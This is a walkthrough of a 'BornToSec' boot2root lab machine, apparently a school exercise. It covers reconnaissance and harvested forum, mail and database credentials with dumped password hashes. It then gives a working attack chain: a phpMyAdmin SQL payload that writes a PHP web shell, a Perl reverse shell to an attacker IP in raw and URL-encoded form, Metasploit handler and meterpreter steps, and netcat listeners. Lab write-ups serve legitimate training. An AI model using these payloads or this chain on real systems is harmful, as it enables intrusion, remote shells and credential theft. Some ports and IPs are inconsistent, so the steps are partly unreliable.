# Writeup1

*Hostname*: `BornToSec`    

## Overview

## Forum infos

Powered by: `My little forum` version  
### admin
- admin
### users
- lmezard       => on forum:!q\]Ej?*5K5cy*AJ
	-   email: laurie@borntosec.net
- qudevide
- thor
- wandre
- zaz

### Posts
There is a post with a log file within:
- there are many connection attempts and we can find a possible password: `!q\]Ej?*5K5cy*AJ`

## Services
### PHP
PHP/5.3.10-1ubuntu3.20
PHPSESSID set in a field => PHP Server behind.

Server behind: Apache/2.2.22 (Ubuntu)

## Ports

Post-scan script results:
| reverse-index: 
|   21/tcp: 10.64.1.105
|   22/tcp: 10.64.1.105
|   80/tcp: 10.64.1.105
|   143/tcp: 10.64.1.105
|   443/tcp: 10.64.1.105
|_  993/tcp: 10.64.1.105

### 21 FTP

*Version*: vsftpd 2.0.8 or later

| ftp-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 0 guesses in 139 seconds, average tps: 0.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
|_banner: 220 Welcome on this server


### 22 SSH

*Version*: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.7

### 80 HTTP

Version: Apache httpd 2.2.22 ((Ubuntu))

### 443 HTTPS

http-enum: 
|   /forum/: Forum
|   /phpmyadmin/: phpMyAdmin
|   /webmail/src/login.php: squirrelmail version 1.4.22
|_  /webmail/images/sm_logo.png: SquirrelMail

#### PHPnyadmin

*version*: phpMyAdmin 3.4.10.1

#### SquirrelMail

*version*: 1.4.2

Vuln: Permet d'installer une backdoor une fois les indentifiants obtenues. 

RCE: once logged
https://10.64.1.105:443/webmail/src/login.php


## OS

Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16

#

TODO
RUN sqlmap avec l'option --form


## Walkthrough


### SquirrelMail

Now we can try to connect to the mailbox with the lmezard's email.

User: lmezard
Email: laurie@borntosec.net
Password: `!q\]Ej?*5K5cy*AJ`

That works!!

Let's explore around...

In a mail we found something interesting:
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

We will see later if the can be useful:
DB Access: `root/Fg-'kKXBj87E:aJ$`

We also have the qudevide's email:

User: qudevide
Email: qudevide@mail.borntosec.net
Password: ?

That is very possible for the other email address's to have this form.    

Voyons voir dans les autres boites de receptions.

Nothing founded in Draft nor Trash folders but in the sent messages we have two mails.

They give us a new address: `ft_root@mail.borntosec.net`

If there is a user named `ft_root` it must be an high administrator and we hav his email addres!!

Now let's try something a little more funny with the squirelMail's RCE vulnerability.

<!-- TODO Try to add the RCE script to metasploit then run it and start to explore inside the machine -->

<!-- Reset the admin password on the forum? -->

### PHPmyAdmin

Now let's try to connect to phpMyAdmin with the credentials founded in the mailbox.   

User: Root
Password: `Fg-'kKXBj87E:aJ$`

And that works. Now we can enumerate a large amount of data from the database.   

Usernames / Emails / Password hashes:
- admin / admin@borntosec.net / ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28
- thor / thor@borntosec.net / d30668b779542d60c4cde29e7170148198b1623f4453866797
- zaz / zaz@borntosec.net / f10b3271bf523f12ebd58ef8581c851991bf0d4b4c4bf49d7c
- qudevide / qudevide@borntosec.net / qudevide@mail.borntosec.net / a12e059d6f4c21c6c5586283c8ecb2b65618ed0a0dc1b302a2
- wandre / wandre@borntosec.net / f8562b53084d60efa4208fa50d1ef753ef18e089d2dd56c4ed
- lmezard / laurie@borntosec.net / 0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa1e5365dc90

To inspect it later we can export the entire database in PMA.    



Detect mysql output location: `show variables like 'datadir';`    

MySQL version:  5.5.44

Vunerable to:

## Penetration

On the [My little Forum](https://github.com/ilosuna/mylittleforum/blob/master/README.md) page, they notice us that the folder `http://IP$FORUM/templates_c/` is writable.

We can find a payload [here](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/). After revise it a little we get this:

	SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
	
Run it in the phpmyadmin's sql editor.    


Now navigate to `http://IP_BOOT2ROOT/forum/templates_c/backdoor.php?cmd=ls`.

That works!! 

Prepare your computer to the connection by starting metasploit and loading the module `multi/handler`.

	use multi/handler
	set LHOST $YOUR_IP
	set LPORT 4242
	run

Now your terminal should be waiting for a new connection.    

Here is the payload to open a reverse-shell ([founded Here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl)):     

	perl -e 'use Socket;$i="10.19.1.26";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};

You must [URL-encode](https://www.urlencoder.org/) this before then now navigate to:

	http://IP_BOOT2ROOT/forum/templates_c/backdoor.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D"10.19.1.26"%3B%24p%3D4343%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28"tcp"%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C">%26S"%29%3Bopen%28STDOUT%2C">%26S"%29%3Bopen%28STDERR%2C">%26S"%29%3Bexec%28"%2Fbin%2Fsh%20-i"%29%3B%7D%3B%27%0A

If this works you must see a new connection into your metasploit's session.    

Now we can try to upgrade our non-tty shell to a [meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).    

Background the session with `CTRL-Z`.    

And use the module `multi/manage/shell_to_meterpreter`.    

	use multi/manage/shell_to_meterpreter
	set SESSION 1
	set LHOST 10.19.1.26
	run
	sessions -l 	# To see if a second session was created.
	sessions -i 2

We can now access to /etc/passwd.

Now forget everything, close metasploit and run:
[You must run this in a bash shell ](https://getridbug.com/information-security/upgrading-a-reverse-shell-with-stty-raw-echo-doesnt-work/)

	bash	 
	nc -lvnk -p 4344 -s 10.09.1.26

Naviagte to:

	https://10.19.1.251/forum/templates_c/backdoor.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%2210.19.1.26%22%3B%24p%3D4344%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27%0A

Now we gonna upgrade our shell to a full tty shell:

	python -c 'import pty; pty.spawn("/bin/bash")'

Now background the session with CTRL-Z and run:

	stty raw -echo && fg
	export TERM=xterm

And now you should have a TTY term in witch yiou can run `sudo`.    

### exploration

In `/home/LOOKATME/password` we can find the lmezard's credentials:

	lmezard		G!@M6f4Eatau{sF"

Let's connect as lmezard and see if there is a something interesting in /home/lmezard:

	su lmezard
	ls /home/lmezard
	cat /home/lmezard/README
		Complete this little challenge and use the result as password for user 'laurie' to login in ssh

The `fun` file is a tar archive.

	chmod +w .
	tar -xf fun
	